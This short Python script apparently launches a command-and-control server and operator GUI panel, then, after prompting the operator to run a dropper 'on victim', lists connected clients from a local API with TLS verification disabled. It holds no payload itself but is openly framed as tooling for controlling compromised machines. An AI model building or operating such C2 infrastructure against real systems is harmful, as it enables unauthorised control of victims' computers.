import subprocess, time, requests, threading

def start_c2():
    subprocess.Popen("cd ../c2_server && go run main.go", shell=True)

def start_gui():
    time.sleep(2)
    subprocess.Popen("python ../gui_panel/main.py", shell=True)

if __name__ == "__main__":
    threading.Thread(target=start_c2).start()
    threading.Thread(target=start_gui).start()
    input("Press Enter after running dropper on victim...\n")
    r = requests.get("https://localhost:443/api/clients", verify=False)
    print("Clients:", r.json())